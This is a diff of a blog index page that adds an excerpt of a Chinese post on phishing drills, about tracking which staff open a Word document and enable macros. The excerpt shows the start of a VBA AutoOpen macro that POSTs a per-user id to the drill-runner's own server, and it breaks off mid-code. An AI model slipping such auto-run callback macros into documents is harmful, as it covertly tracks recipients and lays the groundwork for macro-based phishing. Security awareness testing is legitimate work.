@@ -62,6 +62,70 @@
     <h1 class="page-type-title"></h1>
     
     
+    <article id="post-sY1fGht8q7z0kufG" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/03/26/sy1fght8q7z0kufg/">自动化钓鱼（2):文档类追踪</a>
+</h2>
+
+
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/03/26/sy1fght8q7z0kufg/" class="article-date">
+  <time datetime="2021-03-26T09:17:49.044Z" itemprop="datePublished">2021-03-26</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+      
+      需求：在进行钓鱼演练时，如何追踪哪些人员打开了word文档类，并且开启了宏，如何对这些数据进行追踪（对于网站钓鱼追踪过于简单，不在诉说）
+解决：
+插入如下宏，url为自己服务器地址，里面携带了一个rid，每个rid对应了相应的用户，如果服务器收到了相应的相应，就说明点击开启了宏。
+
+`Sub AutoOpen()
+
+Set objHTTP = CreateObject(“MSXML2.ServerXMLHTTP”)
+URL = “url”
+objHTTP.Open “POST”, URL, False
+objHTTP.setRequestHeader “User-Agent”, “Mozill
+      
+      <a class="article-more-link" href="/2021/03/26/sy1fght8q7z0kufg/">
+        阅读全文...
+      </a>
+      
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://lllllx.top/2021/03/26/sy1fght8q7z0kufg/" data-id="ckmq463bs00006sqc92bwejkb" class="article-share-link">
+        分享
+      </a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+    
     <article id="post-golang-并发邮件探讨" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
